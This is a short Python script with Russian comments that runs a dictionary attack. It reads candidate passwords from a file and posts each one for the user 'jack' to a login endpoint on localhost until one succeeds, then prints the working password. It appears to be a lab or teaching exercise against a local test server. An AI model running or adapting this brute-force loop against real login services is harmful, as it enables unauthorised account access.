import requests


# Генерация плохих паролей
def bad_password_generator():
    global counter
    password = passwords_bad[counter]
    counter += 1
    return password


# Плохие пароли
with open('passwords.txt') as file:
    content = file.read()
    passwords_bad = content.split('\n')
counter = 0

login = 'jack'
while True:
    password = bad_password_generator()

    response = requests.post('http://127.0.0.1:5000/auth', json={'login': login, 'password': password})
    if response.status_code == 200:
        print(f'Good {login}: {password}')
        break
